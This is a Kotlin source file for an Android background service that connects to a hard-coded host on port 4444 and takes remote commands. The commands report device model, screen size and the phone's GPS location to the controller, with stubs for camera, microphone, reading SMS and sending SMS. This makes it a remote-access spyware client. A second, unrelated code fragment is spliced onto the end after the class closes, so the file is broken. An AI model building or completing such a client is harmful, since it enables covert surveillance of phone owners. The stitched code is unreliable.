package com.example.socketclient

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Point
import android.location.Location
import android.location.LocationManager
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import java.io.IOException
import java.net.Socket
import kotlin.concurrent.thread

class SocketService : Service() {

    private val SERVER_IP = "192.168.43.27"
    private val SERVER_PORT = 4444
    private val DELIMITER = "\nJ\\."

    private var socket: Socket? = null

    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null

    override fun onCreate() {
        super.onCreate()
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundServiceWithNotification()
        
        // Initialize MediaProjection if data is provided
        if (intent?.hasExtra("mediaProjectionData") == true) {
            val resultData = intent.getParcelableExtra<Intent>("mediaProjectionData")
            if (resultData != null) {
                mediaProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, resultData)
                Log.d("SocketService", "MediaProjection initialized")
            }
        }
        
        connectToServer()
        return START_STICKY
    }

    private fun startForegroundServiceWithNotification() {
        val channelId = "SocketServiceChannel"
        val channelName = "Socket Service"

        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
            notificationManager.createNotificationChannel(channel)
        }

        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            } else {
                PendingIntent.FLAG_UPDATE_CURRENT
            }
        )

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Socket Service Running")
            .setContentText("Listening for remote commands")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .build()

        startForeground(1, notification)
    }

    private fun connectToServer() {
        thread {
            try {
                socket = Socket(SERVER_IP, SERVER_PORT)
                Log.d("SocketService", "Connected to server")
                listenForCommands()
            } catch (e: IOException) {
                Log.e("SocketService", "Failed to connect to server", e)
                stopSelf()
            }
        }
    }

    private fun listenForCommands() {
        try {
            val input = socket?.getInputStream()
            val buffer = ByteArray(8192)
            while (true) {
                val length = input?.read(buffer) ?: -1
                if (length > 0) {
                    val command = String(buffer, 0, length).trim()
                    Log.d("SocketService", "Received command: $command")
                    handleCommand(command)
                } else if (length == -1) {
                    Log.d("SocketService", "Connection closed by server")
                    break
                }
            }
        } catch (e: IOException) {
            Log.e("SocketService", "Error in socket communication", e)
        } finally {
            stopSelf()
        }
    }

    private fun handleCommand(data: String) {
        val parts = data.split(DELIMITER)
        when (parts[0]) {
            "~" -> {
                val deviceInfo = "${Build.MANUFACTURER}/${Build.MODEL}"
                sendData("~$DELIMITER$deviceInfo")
            }
            "!" -> {
                val size = getScreenSize()
                sendData("!$DELIMITER${size.first}$DELIMITER${size.second}")
            }
            "@" -> {
                captureScreenAndSend()
            }
            "LOC" -> {
                fetchAndSendLocation()
            }
            "CAM" -> {
                // TODO: Implement camera capture and send image data
                sendData("CAM${DELIMITER}Not implemented yet")
            }
            "MIC" -> {
                // TODO: Implement microphone recording and send audio data
                sendData("MIC${DELIMITER}Not implemented yet")
            }
            "SMS" -> {
                // TODO: Read SMS messages and send
                sendData("SMS${DELIMITER}Not implemented yet")
            }
            "SENDSMS" -> {
                // TODO: Send SMS using SmsManager
                sendData("SENDSMS${DELIMITER}Not implemented yet")
            }
            "close" -> {
                stopSelf()
            }
            else -> {
                sendData("ERR${DELIMITER}Unknown command")
            }
        }
    }

    private fun getScreenSize(): Pair<Int, Int> {
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val metrics = wm.currentWindowMetrics
            Pair(metrics.bounds.width(), metrics.bounds.height())
        } else {
            @Suppress("DEPRECATION")
            val display = wm.defaultDisplay
            val size = Point()
            @Suppress("DEPRECATION")
            display.getRealSize(size)
            Pair(size.x, size.y)
        }
    }

    private fun captureScreenAndSend() {
        if (mediaProjection != null) {
            // TODO: Implement actual screen capture using MediaProjection
            sendData("@${DELIMITER}Screen capture initialized")
        } else {
            sendData("@${DELIMITER}MediaProjection not available")
        }
    }

    private fun fetchAndSendLocation() {
        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == 
                android.content.pm.PackageManager.PERMISSION_GRANTED) {
                val locGps: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                val locNet: Location? = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                val loc = locGps ?: locNet

                if (loc != null) {
                    sendData("LOC$DELIMITER${loc.latitude}$DELIMITER${loc.longitude}")
                } else {
                    sendData("LOC${DELIMITER}Location unavailable")
                }
            } else {
                sendData("LOC${DELIMITER}Permission denied")
            }
        } catch (e: SecurityException) {
            sendData("LOC${DELIMITER}Permission denied")
        }
    }

    private fun sendData(message: String) {
        thread {
            try {
                socket?.getOutputStream()?.apply {
                    write(message.toByteArray())
                    flush()
                }
                Log.d("SocketService", "Sent: $message")
            } catch (e: IOException) {
                Log.e("SocketService", "Error sending data", e)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            mediaProjection?.stop()
            socket?.close()
        } catch (e: Exception) {
            Log.e("SocketService", "Error in onDestroy", e)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}                "Socket Service Channel",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Socket Service Running")
            .setContentText("Connected to $SERVER_IP:$SERVER_PORT")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()
    }

    private fun connectToServer(ip: String, port: Int) {
        thread {
            try {
                socket = Socket(ip, port)
                // TODO: Implement your socket communication here
            } catch (e: Exception) {
                e.printStackTrace()
                // TODO: Add reconnect logic if needed
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        socket?.close()
        super.onDestroy()
    }
}
